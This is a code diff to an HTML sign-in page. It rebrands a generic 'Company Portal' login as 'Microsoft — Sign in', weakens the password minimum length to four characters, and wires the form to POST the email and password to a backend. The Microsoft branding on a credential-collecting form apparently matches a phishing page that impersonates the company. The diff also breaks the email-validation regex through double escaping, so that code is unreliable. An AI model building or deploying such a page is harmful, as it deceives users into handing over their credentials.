@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width,initial-scale=1" />
-<title>Company Portal — Sign in</title>
+<title>Microsoft — Sign in</title>
 <style>
   :root{
     --bg:#f3f4f6;
@@ -38,10 +38,9 @@
   .logo{width:160px;margin-bottom:40px;}
   .logo img{width:100%;height:auto;display:block;}
 
-  /* smaller title */
   h3{
     margin:0 0 6px;
-    font-size:24px;             /* smaller heading */
+    font-size:24px;
     font-weight:500;
     text-align:left;
   }
@@ -121,7 +120,7 @@
 
     <!-- Step 2 -->
     <div id="passwordStep" style="display:none;">
-      <input id="password" type="password" placeholder="Enter your password" required minlength="8" />
+      <input id="password" type="password" placeholder="Enter your password" required minlength="4" />
       <div class="error" id="pwError" style="display:none"></div>
       <button class="btn" type="submit">Sign in</button>
       <div class="small"><a href="#" class="link">Forgot password?</a></div>
@@ -142,7 +141,7 @@
   const emailError=document.getElementById('emailError');
   const pwError=document.getElementById('pwError');
   const form=document.getElementById('loginForm');
-  const validEmail=/^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+  const validEmail=/^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/;
 
   nextBtn.addEventListener('click',()=>{
     emailError.style.display='none';
@@ -157,16 +156,39 @@
     passwordInput.focus();
   });
 
-  form.addEventListener('submit',e=>{
+  form.addEventListener('submit',async e=>{
     e.preventDefault();
     pwError.style.display='none';
-    const pw=passwordInput.value.trim();
-    if(!pw){
+    const email=emailInput.value.trim();
+    const password=passwordInput.value.trim();
+
+    if(!password){
       pwError.textContent='Please enter your password.';
       pwError.style.display='block';
       return;
     }
-    alert('Email: '+emailInput.value+'\\nPassword: [hidden]\\nValidated locally.');
+
+    try {
+      // Send login request to backend
+      const res = await fetch('/login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ username: email, password })
+      });
+
+      if(res.ok){
+        // Redirect to dashboard if successful
+        window.location.href = '/dashboard.html';
+      } else {
+        const msg = await res.text();
+        pwError.textContent = msg || 'Invalid credentials. Please try again.';
+        pwError.style.display = 'block';
+      }
+    } catch (err) {
+      pwError.textContent = 'Network error. Please try again.';
+      pwError.style.display = 'block';
+      console.error(err);
+    }
   });
 </script>
 </body>
